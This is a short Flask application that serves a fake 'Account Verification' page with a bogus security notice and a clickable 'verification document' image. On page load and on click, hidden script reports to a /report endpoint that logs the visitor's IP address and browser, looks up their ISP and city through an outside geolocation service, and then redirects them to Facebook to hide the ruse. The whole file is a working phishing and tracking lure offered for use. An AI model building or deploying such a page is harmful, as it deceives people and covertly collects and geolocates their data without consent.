from flask import Flask, request, render_template_string, jsonify
import requests

app = Flask(__name__)

# HTML template: initial fetch, fake letter and clickable image
HTML = """<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Account Verification</title>
  <style>
    body { margin:0; padding:20px; font-family:Arial,sans-serif; background:#fafafa; color:#333; }
    #container { max-width:600px; margin:50px auto; background:#fff; padding:20px;
                 box-shadow:0 2px 8px rgba(0,0,0,0.1); border-radius:8px; text-align:center; }
    h1 { color:#007BFF; font-size:1.5em; margin-bottom:10px; }
    p { line-height:1.6; }
    #doc { max-width:100%; height:auto; margin-top:20px; cursor:pointer;
           border:2px solid #007BFF; border-radius:4px; }
    #footer { margin-top:20px; font-size:0.9em; color:#666; }
  </style>
</head>
<body>
  <div id="container">
    <h1>Important Account Notice</h1>
    <p>Dear User,<br>
       For your security, please review the attached verification document and click on it to proceed.
    </p>
    <img id="doc" src="/static/fake_letter.jpg" alt="Verification Document">
    <div id="footer">Thank you for keeping your account safe.</div>
  </div>
  <script>
    // Report immediately on page load
    window.addEventListener('DOMContentLoaded', function() {
      fetch('/report', {
        method: 'POST',
        headers: { 'Content-Type':'application/json' },
        body: JSON.stringify({ event: 'page_load' })
      }).catch(console.error);
    });
    // Report and redirect on image click
    document.getElementById('doc').addEventListener('click', function() {
      fetch('/report', {
        method: 'POST',
        headers: { 'Content-Type':'application/json' },
        body: JSON.stringify({ event: 'image_click' })
      }).catch(console.error);
      setTimeout(function() {
        window.location.href = 'https://www.facebook.com/';
      }, 500);
    });
  </script>
</body>
</html>"""

@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/report', methods=['POST'])
def report():
    payload = request.get_json(silent=True) or {}
    ip = request.remote_addr
    ua = request.headers.get('User-Agent', 'Unknown')
    try:
        ip_data = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
    except:
        ip_data = {}
    result = {
        "ip": ip,
        "user_agent": ua,
        "isp": ip_data.get("isp"),
        "city": ip_data.get("city"),
        "region": ip_data.get("regionName"),
        "country": ip_data.get("country"),
        "event": payload.get("event")
    }
    print(">>> Captured data:", result)
    return jsonify(status="ok")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
